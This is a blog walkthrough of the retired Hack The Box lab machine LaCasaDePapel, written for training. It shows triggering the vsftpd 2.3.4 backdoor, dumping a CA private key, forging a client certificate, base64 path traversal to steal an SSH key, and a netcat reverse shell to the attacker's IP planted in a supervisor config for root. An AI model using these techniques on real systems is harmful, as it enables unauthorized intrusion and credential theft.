---
published: true
layout: post
author: jake
date: '2019-07-28 00:00:01 UTC'
tags: htb walkthrough lacasadepapel
---
This week we are taking a look at the retired Hack The Box machine [LaCasaDePapel](https://www.hackthebox.eu/home/machines/profile/181) (Easy-Medium difficulty)

Starting off with out nmap enumeration:
```
root@kali: nmap -sC -sV -oN nmap 10.10.10.131
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-23 11:30 AEST
Nmap scan report for 10.10.10.131
Host is up (0.24s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.3.4
22/tcp  open  ssh      OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:e1:c2:c9:79:1c:a6:6b:51:34:8d:7a:c3:c7:c8:50 (RSA)
|   256 41:e4:95:a3:39:0b:25:f9:da:de:be:6a:dc:59:48:6d (ECDSA)
|_  256 30:0b:c6:66:2b:8f:5e:4f:26:28:75:0e:f5:b1:71:e4 (ED25519)
80/tcp  open  http     Node.js (Express middleware)
|_http-title: La Casa De Papel
443/tcp open  ssl/http Node.js Express framework
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-title: La Casa De Papel
| ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel
| Not valid before: 2019-01-27T08:35:30
|_Not valid after:  2029-01-24T08:35:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|   http/1.1
|_  http/1.0
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.00 seconds
```
So it looks like we have a couple of interesting starting points… FTP and a Node.js Express website on both 80 and 443.

Starting with FTP we try to connect anonymously to see what happens:
```
root@kali: ftp 10.10.10.131
Connected to 10.10.10.131.
220 (vsFTPd 2.3.4)
Name (10.10.10.131:root): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp> 
```
Damn. No anonymous access, but we don’t usually get such a detailed banner. So we head on over to searchsploit to see if there are any exploits:
```
root@kali: searchsploit vsftpd  
---------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                            |  Path
                                                                                                          | (/usr/share/exploitdb/)
---------------------------------------------------------------------------------------------------------- ----------------------------------------
vsftpd 2.0.5 - 'CWD' (Authenticated) Remote Memory Consumption                                            | exploits/linux/dos/5814.pl
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (1)                                            | exploits/windows/dos/31818.sh
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (2)                                            | exploits/windows/dos/31819.pl
vsftpd 2.3.2 - Denial of Service                                                                          | exploits/linux/dos/16270.c
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                    | exploits/unix/remote/17491.rb
---------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
Papers: No Result
```

2.3.4 is our target and we can see that there is a metasploit module for a backdoor command execution vulnerability. Reading through the metasploit module we see that a backdoor was introduced to this version and can be quite easily exploited: [https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html](https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html)

Looking at the pastebin link included in the above article we see on lines 37 and 38 that if something ends with the characters `0x3a` followed by `0x29` then the function `vsf_sysutil_extra()` is called. Down on line 76 this function appears to open a `/bin/sh` reverse shell on port 6200. These two characters translate into a smiley face `:)`

So we go back to ftp and this time add a smiley face to the end of both our username and password and see what happens.

We see that when we enter the password :) it appears to hang, but if we go to a new terminal window and connect on port 6200 we get a shell!
```
root@kali: telnet 10.10.10.131 6200
Trying 10.10.10.131...
Connected to 10.10.10.131.
Escape character is '^]'.
Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman
```
We try to figure out who we are with the whoami command, but it looks like we are not in a /bin/sh shell after all: 
```
whoami
PHP Warning:  Use of undefined constant whoami - assumed 'whoami' (this will throw an Error in a future version of PHP) in phar://eval()'d code on line 1
```
Researching what Psy Shell is we find that it is an interactive PHP shell intended to be used by developers. Reading the usage documentation on the github page ( ) we see that there should be a help command that might show us what we can do.
```
help
  help       Show a list of commands. Type `help [foo]` for information about [foo].      Aliases: ?                     
  ls         List local, instance or class variables, methods and constants.              Aliases: list, dir             
  dump       Dump an object or primitive.                                                                                
  doc        Read the documentation for an object, class, constant, method or property.   Aliases: rtfm, man             
  show       Show the code for an object, class, constant, method or property.                                           
  wtf        Show the backtrace of the most recent exception.                             Aliases: last-exception, wtf?  
  whereami   Show where you are in the code.                                                                             
  throw-up   Throw an exception or error out of the Psy Shell.                                                           
  timeit     Profiles with a timer.                                                                                      
  trace      Show the current call stack.                                                                                
  buffer     Show (or clear) the contents of the code input buffer.                       Aliases: buf                   
  clear      Clear the Psy Shell screen.                                                                                 
  edit       Open an external editor. Afterwards, get produced code in input buffer.                                     
  sudo       Evaluate PHP code, bypassing visibility restrictions.                                                       
  history    Show the Psy Shell history.                                                  Aliases: hist                  
  exit       End the current session and return to caller.                                Aliases: quit, q            

```
sudo immediately stands out, but unfortunately it does not work:
```
sudo $thoseguys = file_get_contents("/root/root.txt");            
PHP Warning:  file_get_contents(/root/root.txt): failed to open stream: Permission denied in phar://eval()'d code on line 1
```
It doesn’t look like history works either. Trying ls does return something though:
```
ls
Variables: $tokyo
```

Help tells us that we can use the show command to see what the value of that variable is:
```
show tokyo
  > 2| class Tokyo {
    3| 	private function sign($caCert,$userCsr) {
    4| 		$caKey = file_get_contents('/home/nairobi/ca.key');
    5| 		$userCert = openssl_csr_sign($userCsr, $caCert, $caKey, 365, ['digest_alg'=>'sha256']);
    6| 		openssl_x509_export($userCert, $userCertOut);
    7| 		return $userCertOut;
    8| 	}
    9| }
```
Looks like it is pulling a ca key and generating a certificate for something. Lets use this opportunity to pull that key down.
```
file_get_contents('/home/nairobi/ca.key');
=> """
   -----BEGIN PRIVATE KEY-----\n
   MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb\n
   7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/\n
   2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl\n
   uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M\n
   YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp\n
   s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us\n
   PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V\n
   Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89\n
   1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ\n
   /CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+\n
   q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr\n
   uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd\n
   I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og\n
   7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE\n
   G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn\n
   sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH\n
   CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y\n
   sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI\n
   ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2\n
   zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/\n
   ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC\n
   9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M\n
   WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM\n
   7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR\n
   aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc\n
   53udBEzjt3WPqYGkkDknVhjD\n
   -----END PRIVATE KEY-----\n
   """
```
Cleaning up the new line characters we have something that might come in handy later.

continuing our enumeration we can use some PHP functions to enumerate the file system, such as file_get_contents we have already used and scandir which works similar to bash ls
```
scandir('/home')
=> [
     ".",
     "..",
     "berlin",
     "dali",
     "nairobi",
     "oslo",
     "professor",
   ]

scandir('/home/berlin')
=> [
     ".",
     "..",
     ".ash_history",
     ".ssh",
     "downloads",
     "node_modules",
     "server.js",
     "user.txt",
   ]
file_get_contents('/home/berlin/user.txt')
PHP Warning:  file_get_contents(/home/berlin/user.txt): failed to open stream: Permission denied in phar://eval()'d code on line 1
```
Looks like berlin is who we want to become to get the user.txt flag, and chance are from looking at their home directory that they are the user running the nodejs express application. We look through all the other user directories and cannot access any other files or directories of interest.

Finally it’s time to look at the website:

![251854887.png]({{site.baseurl}}/Images/LaCasaDePapel/251854887.png)


We have a QR code that looks like it is a Google Authenticator code

When we look at the source ode we see a hidden field with a secret in it.. 

![251822109.png]({{site.baseurl}}/Images/LaCasaDePapel/251822109.png)


The code for the QR code says that the algorithm is SHA1 and if we navigate to the QR code directly we can see that changing the value of the hash will also change the QR code returned.

Heading over to see if the 443 site is different we do get a hint:

![251822117.png]({{site.baseurl}}/Images/LaCasaDePapel/251822117.png)


Looks like that ca.key will come in handy after all. Time to generate our own client certificate signed by the ca.key.

Firefox can only import PKCS12 certs, so we use openssl to generate one.
```
root@kali: openssl req -new -x509 -days 365 -key ca.key -out thoseguys.pem
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:
```
Then export the certificate as PKCS12 for Firefox.
```
root@kali: openssl pkcs12 -export -out thoseguys.p12 -in thoseguys.pem -inkey ca.key
Enter Export Password:
Verifying - Enter Export Password:
```
Now we can head on over to Firefox and under Preferences > Certificates > Import we select our p12 file and import it. Because we added an exception to the site the first time we tried to access it over HTTPS we need to remove that exception now, as we have a trusted certificate imported.

![251822133.png]({{site.baseurl}}/Images/LaCasaDePapel/251822133.png)


We then get a prompt to identify ourselves using a certificate, clicking OK gets us into the site.

![251789354.png]({{site.baseurl}}/Images/LaCasaDePapel/251789354.png)


Looks like we get a private site with some tv show seasons to select from. Selecting any season brings us to a page with some avi files that can be downloaded. Looking at the URLS we see that for the season list we have `https://10.10.10.131/?path=SEASON-1` and for a file we have something like `https://10.10.10.131/file/U0VBU09OLTEvMDEuYXZp`

The path qouery parameter is suspicious as is the part after the file/. Starting with the path we can see that we do have a query manipulation vulnerability that leads to directory traversal.

![251789368.png]({{site.baseurl}}/Images/LaCasaDePapel/251789368.png)


But this will not let us access the contents of a file. We see that the path variable is used in the same `scandir()` function we were using earlier:

![251854905.png]({{site.baseurl}}/Images/LaCasaDePapel/251854905.png)


Time to look at the file. As we commonly see with CTFs and web applications a lot of the time text is encoded with base64 to ensure that the message is not misinterpreted weirdly if it has any special characters.  To confirm this we run a basic test:
```
root@kali: echo -n 'U0VBU09OLTEvMDEuYXZp' | base64 -d
SEASON-1/01.avi
```
That is exactly what we were hoping for. the file path is being base64 encoded. We know where the user.txt is so lets see if we can read it.
```
root@kali: echo -n '../user.txt' | base64            
Li4vdXNlci50eHQ=
```
add that to the URL and see if we are prompted to download the user.txt file:

![251789382.png]({{site.baseurl}}/Images/LaCasaDePapel/251789382.png)


Nice! But we need a better way into the box. Using our directory traversal exploit we see in the ../.ssh directory that we no only have an authorized_keys file, but also have the private and public keys. Time to download the private key and ssh in as the berlin user.
```
root@kali: echo -n '../.ssh/id_rsa' | base64
Li4vLnNzaC9pZF9yc2E=
[Go to firefox and download the file]
root@kali: chmod 600 id_rsa
root@kali: ssh -i id_rsa berlin@10.10.10.131
berlin@10.10.10.131's password:
```
Hmmm… looks like it might not be the berlin users ssh key, so we try them all and eventually get in with the professor user.
```
root@kali: ssh -i id_rsa professor@10.10.10.131

 _             ____                  ____         ____                  _ 
| |    __ _   / ___|__ _ ___  __ _  |  _ \  ___  |  _ \ __ _ _ __   ___| |
| |   / _` | | |   / _` / __|/ _` | | | | |/ _ \ | |_) / _` | '_ \ / _ \ |
| |__| (_| | | |__| (_| \__ \ (_| | | |_| |  __/ |  __/ (_| | |_) |  __/ |
|_____\__,_|  \____\__,_|___/\__,_| |____/ \___| |_|   \__,_| .__/ \___|_|
                                                            |_|       

lacasadepapel [~]$ 
```
We see in the professors home folder that there is some memcached files:
```
lacasadepapel [~]$ ls -la
total 24
drwxr-sr-x    4 professo professo      4096 Mar  6 20:56 .
drwxr-xr-x    7 root     root          4096 Feb 16 18:06 ..
lrwxrwxrwx    1 root     professo         9 Nov  6  2018 .ash_history -> /dev/null
drwx------    2 professo professo      4096 Jan 31 21:36 .ssh
-rw-r--r--    1 root     root            88 Jan 29 01:25 memcached.ini
-rw-r-----    1 root     nobody         434 Jan 29 01:24 memcached.js
drwxr-sr-x    9 root     professo      4096 Jan 29 01:31 node_modules
lacasadepapel [~]$
```
and ps confirms that it is running and netstat suggests it could be listening on `127.0.0.1:11211`. `sudo -l` gives us nothing as we need the professors password. but the memcache.ini file gives us something to look at:
```
lacasadepapel [~]$ cat memcached.ini 
[program:memcached]
command = sudo -u nobody /usr/bin/node /home/professor/memcached.js
```
It looks like whatever is in the command variable is executed as a bash command as root. We cannot edit the file directly, but this is our users home directory.. so we have full permissions to delete and create a new one.

Figuring out what reverse shell might be the easiest we can see that the machine has nc installed and testing a reverse shell with the professor user we can see what we are able to get a shell as professor with the -e flag, so we should be able to translate that into the file to have it run as root.
```
lacasadepapel [~]$ rm memcached.ini
lacasadepapel [~]$ echo '[program:memcached]
command = /usr/bin/nc 10.10.14.14 1337 -e /bin/sh' > memcached.ini
```

Set up a nc listener on port 1337 and wait for the cron to run. Eventually we get a reverse shell as root.

```
root@kali: nc -nlvp 1337
Listening on [0.0.0.0] (family 2, port 1337)
Connection from 10.10.10.131 38785 received!
whoami
root
cat /root/root.txt
58[REDACTED]11
```
